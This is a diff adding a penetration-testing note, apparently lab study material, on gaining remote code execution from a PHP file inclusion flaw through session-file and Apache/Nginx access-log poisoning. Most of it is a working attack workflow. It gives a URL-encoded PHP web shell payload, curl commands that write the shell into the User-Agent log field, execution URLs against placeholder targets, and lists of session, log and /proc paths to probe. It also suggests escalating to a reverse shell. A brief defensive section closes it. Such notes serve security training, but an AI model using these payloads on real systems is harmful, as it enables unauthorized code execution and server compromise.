@@ -1,0 +1,553 @@
+# File Inclusion – RCE via Log Poisoning
+
+## Overview
+
+If a file inclusion vulnerability can **execute code**, then any file containing attacker-controlled PHP may become a route to **remote code execution**.
+
+Log poisoning works by:
+
+1. finding a file the application will include
+2. injecting PHP code into a file that gets written by the server
+3. including that file through the LFI
+4. executing commands through the injected PHP
+
+It is the same core idea as the upload-based attack:  
+**get PHP into a readable file, then include it.**
+
+This technique is especially useful when:
+
+- file uploads are unavailable
+- wrappers are disabled
+- remote inclusion is blocked
+- sessions or logs are readable by the web application
+
+---
+
+# Preconditions
+
+For log poisoning to work, the following must be true:
+
+- the application has an **LFI/file inclusion vulnerability**
+- the inclusion function has **execute** capability
+- we can write attacker-controlled data into a file on disk
+- the web application can **read** that file
+
+## Common vulnerable execute-capable functions
+
+| Language | Function | Read Content | Execute | Remote URL |
+|---|---|---:|---:|---:|
+| PHP | `include()` / `include_once()` | ✅ | ✅ | ✅ |
+| PHP | `require()` / `require_once()` | ✅ | ✅ | ❌ |
+| NodeJS | `res.render()` | ✅ | ✅ | ❌ |
+| Java | `import` | ✅ | ✅ | ✅ |
+| .NET | `include` | ✅ | ✅ | ✅ |
+
+---
+
+# Main Log Poisoning Routes
+
+The two common paths covered here are:
+
+1. **PHP session poisoning**
+2. **server access log poisoning**
+
+Both rely on the same principle: write PHP code somewhere the app stores it, then include that file.
+
+---
+
+# 1. PHP Session Poisoning
+
+Most PHP applications use a `PHPSESSID` cookie to identify a user session. Session data is stored on disk in a file tied to that session ID.
+
+## Common session file locations
+
+### Linux
+```text
+/var/lib/php/sessions/
+```
+
+### Windows
+```text
+C:\Windows\Temp\
+```
+
+## Session filename pattern
+
+If the cookie is:
+
+```text
+PHPSESSID=el4ukv0kqbvoirg7nkp4dncpk3
+```
+
+then the session file is usually:
+
+```text
+/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3
+```
+
+---
+
+# Step 1 – Get your PHPSESSID
+
+Inspect your cookies in the browser or a proxy.
+
+Example:
+
+```text
+PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd
+```
+
+So the likely session file is:
+
+```text
+/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+```
+
+---
+
+# Step 2 – Include the session file through LFI
+
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+```
+
+If readable, you may see key/value style session content.
+
+Example idea:
+
+```text
+page|s:6:"es.php";preference|s:2:"es";
+```
+
+This tells us what data exists in the file and whether we can influence any of it.
+
+---
+
+# Step 3 – Find a controllable session value
+
+If the application stores something from a user-controlled parameter, that is the field we can poison.
+
+Example target parameter:
+
+```text
+?language=session_poisoning
+```
+
+Visit:
+
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
+```
+
+Then re-open the session file:
+
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+```
+
+If the value changed, we know we control data inside the session file.
+
+---
+
+# Step 4 – Poison the session file with PHP
+
+Inject a URL-encoded PHP web shell into the session-controlled value:
+
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+
+Decoded payload:
+
+```php
+<?php system($_GET["cmd"]); ?>
+```
+
+Now the session file should contain executable PHP.
+
+---
+
+# Step 5 – Include the session file and execute commands
+
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+
+Expected output style:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+---
+
+# Important Session Poisoning Note
+
+Session files are often overwritten by subsequent requests. That means:
+
+- your shell may not persist long
+- you may need to **re-poison** before each command
+- the best next step is usually to:
+  - write a permanent shell to disk, or
+  - launch a reverse shell
+
+Think of the session file as writing on a whiteboard in a busy office. It may be wiped at any time.
+
+---
+
+# 2. Server Log Poisoning
+
+Web servers log requests. If we can control part of a request that gets written to a log file, and the app can later include that log file, then our injected PHP can execute.
+
+The most common field used for this is:
+
+- **User-Agent**
+
+because we fully control it in HTTP requests.
+
+---
+
+# Common log locations
+
+## Apache
+
+### Linux
+```text
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+```
+
+### Windows
+```text
+C:\xampp\apache\logs\
+```
+
+## Nginx
+
+### Linux
+```text
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+```
+
+### Windows
+```text
+C:\nginx\log\
+```
+
+---
+
+# Readability considerations
+
+- **Nginx logs** are more often readable by low-privileged web users
+- **Apache logs** are often restricted to `root` or `adm`
+- older or misconfigured systems may expose Apache logs to the web user
+
+So always test log readability rather than assuming.
+
+---
+
+# Step 1 – Try to include the access log
+
+Example Apache path:
+
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
+```
+
+If successful, you may see logged request lines, including the User-Agent.
+
+---
+
+# Step 2 – Poison the User-Agent
+
+## Using Burp Suite
+Intercept any request and change:
+
+```http
+User-Agent: <?php system($_GET['cmd']); ?>
+```
+
+Then forward the request so it gets written to the log.
+
+## Using cURL
+Create a header file:
+
+```bash
+echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+```
+
+Then send a request:
+
+```bash
+curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+```
+
+This writes the PHP payload into the access log.
+
+---
+
+# Step 3 – Include the poisoned log and execute commands
+
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
+```
+
+If successful, the payload inside the log executes.
+
+Expected output style:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+The same idea applies to Nginx logs:
+
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/log/nginx/access.log&cmd=id
+```
+
+---
+
+# Why This Works
+
+A log file is normally just text. But once a vulnerable `include()` pulls it into a PHP execution context, the PHP interpreter does not care that it came from a log. It only sees:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+That is enough.
+
+It is like hiding instructions inside an office visitor log, then tricking the system into reading the log as code instead of as text.
+
+---
+
+# /proc Poisoning Variant
+
+Sometimes Apache/Nginx logs are unreadable, but process-related files may still expose attacker-controlled headers such as `User-Agent`.
+
+Interesting targets include:
+
+```text
+/proc/self/environ
+/proc/self/fd/N
+```
+
+Where `N` may be a descriptor or PID-related reference, often tested in a small range.
+
+Examples to try:
+
+```text
+/proc/self/environ
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+```
+
+Or fuzz nearby values.
+
+## Caution
+These often require higher privileges too, and behavior varies by system.
+
+---
+
+# Other Logs Worth Testing
+
+If the service is reachable and logs fields we control, we may be able to poison it.
+
+Examples:
+
+```text
+/var/log/sshd.log
+/var/log/mail
+/var/log/vsftpd.log
+```
+
+## General idea
+
+- **SSH**: try a username containing PHP
+- **FTP**: try a username containing PHP
+- **Mail**: send an email containing PHP into loggable fields
+
+Then include the log file through the LFI.
+
+This is broader than “Apache log poisoning.” The real pattern is:
+
+> Any readable file that logs attacker-controlled input can potentially be poisoned.
+
+---
+
+# Attack Strategy Summary
+
+## Session poisoning
+Best when:
+
+- PHP sessions are in a predictable location
+- session data contains a user-controlled field
+- session files are readable
+
+## Access log poisoning
+Best when:
+
+- access logs are readable
+- you can control headers like `User-Agent`
+- the LFI can execute included content
+
+## Other service log poisoning
+Useful when:
+
+- web logs are inaccessible
+- another exposed service logs attacker-controlled strings
+- those logs are readable
+
+---
+
+# Common Pitfalls
+
+## Log file is too large
+Including huge logs can:
+
+- slow the application
+- crash the page
+- create noise
+- be risky in production
+
+Be efficient. Poison with a fresh request, then include immediately.
+
+## PHP not executing
+Possible reasons:
+
+- the inclusion function reads but does not execute
+- your payload is malformed
+- quotes are broken by the logger or encoding
+- wrong file path
+
+## Session value not controllable
+If the app stores no user-controlled input in the session, session poisoning will fail.
+
+## Log unreadable
+The web user may not have permission to read it.
+
+---
+
+# Practical Workflow
+
+## PHP Session Poisoning
+
+### 1. Identify session cookie
+```text
+PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd
+```
+
+### 2. Read session file
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+```
+
+### 3. Poison controllable field
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+
+### 4. Execute
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+
+---
+
+## Apache/Nginx Log Poisoning
+
+### 1. Read log
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
+```
+
+### 2. Poison User-Agent
+```bash
+echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+```
+
+### 3. Execute
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
+```
+
+---
+
+# Quick Commands
+
+## cURL header poisoning
+```bash
+echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+```
+
+## Read session file
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>
+```
+
+## Poison session with web shell
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+
+## Execute via session file
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
+```
+
+## Execute via Apache access log
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
+```
+
+## Execute via Nginx access log
+```text
+http://<SERVER_IP>:<PORT>/index.php?language=/var/log/nginx/access.log&cmd=id
+```
+
+---
+
+# Defensive Notes
+
+To prevent this attack chain:
+
+- never pass unsanitized user input into include/require logic
+- disable execution-capable inclusion patterns
+- store sessions securely and outside risky inclusion paths
+- restrict log readability for the web user
+- sanitize logged fields or isolate them from execution contexts
+- disable unnecessary PHP behaviors
+- monitor for PHP tags in logs, sessions, and headers
+
+---
+
+# Key Takeaways
+
+- log poisoning turns text files into code execution if the app includes them
+- PHP sessions are often an overlooked writable target
+- `User-Agent` is one of the easiest server-side log poisoning vectors
+- Apache and Nginx log locations differ, and permissions matter
+- session poisoning is often short-lived because session files get overwritten
+- any readable log containing attacker-controlled data can become a candidate
+
+---
+
+# Tags
+
+#file-inclusion
+#lfi
+#rce
+#log-poisoning
+#php
+#session-poisoning
+#apache
+#nginx
+#proc
+#webshell
+#pentesting
+#obsidian
